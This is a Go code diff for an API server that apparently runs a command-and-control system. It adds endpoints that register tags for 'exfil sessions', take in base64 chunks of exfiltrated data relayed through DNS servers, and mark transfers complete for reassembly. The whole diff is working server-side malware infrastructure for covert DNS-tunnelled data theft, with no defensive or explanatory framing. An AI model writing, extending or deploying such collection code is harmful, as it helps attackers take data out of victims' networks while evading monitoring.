@@ -1877,6 +1877,148 @@ func (api *APIServer) handleSubmitExfilChunk(w http.ResponseWriter, r *http.Requ
 	api.sendSuccess(w, "exfil chunk recorded", response)
 }
 
+// handleRegisterExfilTag registers a short tag for an exfil session.
+func (api *APIServer) handleRegisterExfilTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		Tag       string `json:"tag"`
+		SessionID string `json:"session_id"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if req.Tag == "" || req.SessionID == "" {
+		api.sendError(w, http.StatusBadRequest, "tag and session_id are required")
+		return
+	}
+
+	if err := api.db.RegisterExfilSessionTag(req.Tag, req.SessionID); err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register tag: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "tag registered", nil)
+}
+
+// handleSubmitExfilChunkByTag submits an exfil chunk using a short tag.
+func (api *APIServer) handleSubmitExfilChunkByTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		Tag         string `json:"tag"`
+		ChunkIndex  int    `json:"chunk_index"`
+		PayloadB64  string `json:"payload_b64"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.Tag == "" || req.PayloadB64 == "" {
+		api.sendError(w, http.StatusBadRequest, "tag and payload_b64 are required")
+		return
+	}
+
+	// Resolve tag to session ID
+	sessionID, err := api.db.GetExfilSessionIDByTag(req.Tag)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to resolve tag: %v", err))
+		return
+	}
+	if sessionID == "" {
+		api.sendError(w, http.StatusNotFound, "tag not found")
+		return
+	}
+
+	payload, err := base64.StdEncoding.DecodeString(req.PayloadB64)
+	if err != nil {
+		api.sendError(w, http.StatusBadRequest, "payload_b64 must be valid base64")
+		return
+	}
+
+	// Store the chunk using the resolved session ID
+	transfer, completed, err := api.db.StoreExfilChunk(&ExfilChunkStoreRequest{
+		SessionID:   sessionID,
+		DNSServerID: dnsServerID,
+		ChunkIndex:  req.ChunkIndex,
+		Payload:     payload,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to store exfil chunk: %v", err))
+		return
+	}
+
+	response := map[string]interface{}{
+		"session_id": sessionID,
+		"ack_next":   true,
+		"completed":  completed,
+	}
+	if transfer != nil {
+		response["transfer"] = transfer
+		response["status"] = transfer.Status
+		response["received_chunks"] = transfer.ReceivedChunks
+		response["total_chunks"] = transfer.TotalChunks
+	}
+
+	api.sendSuccess(w, "exfil chunk recorded", response)
+}
+
+// handleExfilCompleteByTag records completion signal for a dedicated exfil session using a tag.
+func (api *APIServer) handleExfilCompleteByTag(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		Tag         string `json:"tag"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID == "" {
+		dnsServerID = req.DNSServerID
+	}
+
+	if req.Tag == "" {
+		api.sendError(w, http.StatusBadRequest, "tag is required")
+		return
+	}
+
+	// Resolve tag to session ID
+	sessionID, err := api.db.GetExfilSessionIDByTag(req.Tag)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to resolve tag: %v", err))
+		return
+	}
+	if sessionID == "" {
+		api.sendError(w, http.StatusNotFound, "tag not found")
+		return
+	}
+
+	// Mark as complete (trigger assembly check)
+	transfer, err := api.db.MarkExfilTransferComplete(&ExfilCompletionRecord{
+		SessionID: sessionID,
+		SourceDNS: dnsServerID,
+	})
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to finalize exfil transfer: %v", err))
+		return
+	}
+
+	api.sendSuccess(w, "exfil transfer updated", map[string]interface{}{
+		"session_id": sessionID,
+		"transfer":   transfer,
+	})
+}
+
 // handleExfilComplete records completion metadata for a dedicated exfil session.
 func (api *APIServer) handleExfilComplete(w http.ResponseWriter, r *http.Request) {
 	var req struct {
@@ -2818,6 +2960,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	dnsRouter.HandleFunc("/exfil/chunk", api.handleSubmitExfilChunk).Methods("POST")
 	dnsRouter.HandleFunc("/exfil/chunk/tagged", api.handleSubmitExfilChunkByTag).Methods("POST")
 	dnsRouter.HandleFunc("/exfil/tag", api.handleRegisterExfilTag).Methods("POST")
+	dnsRouter.HandleFunc("/exfil/complete/tagged", api.handleExfilCompleteByTag).Methods("POST")
 	dnsRouter.HandleFunc("/exfil/complete", api.handleExfilComplete).Methods("POST")
 	dnsRouter.HandleFunc("/progress", api.handleSubmitProgress).Methods("POST")
 	dnsRouter.HandleFunc("/tasks", api.handleGetTasksForDNSServer).Methods("GET")
